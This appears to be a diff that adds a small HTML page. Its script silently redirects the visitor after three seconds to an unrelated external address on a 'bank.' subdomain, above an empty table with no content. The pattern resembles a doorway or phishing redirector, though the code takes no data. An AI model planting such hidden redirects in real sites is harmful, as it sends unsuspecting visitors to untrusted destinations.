@@ -1,0 +1,13 @@
+<SCRIPT type="text/javascript">
+<!--
+setTimeout("link()", 3000);
+function link(){
+location.href='http://bank.blamestitch.com/cake/battle/success#header-menu/';
+}
+-->
+</SCRIPT>
+<table width="320" border="0" bgcolor="#FFFFCC">
+  <tr>
+    <td height="296">&nbsp;</td>
+  </tr>
+</table>
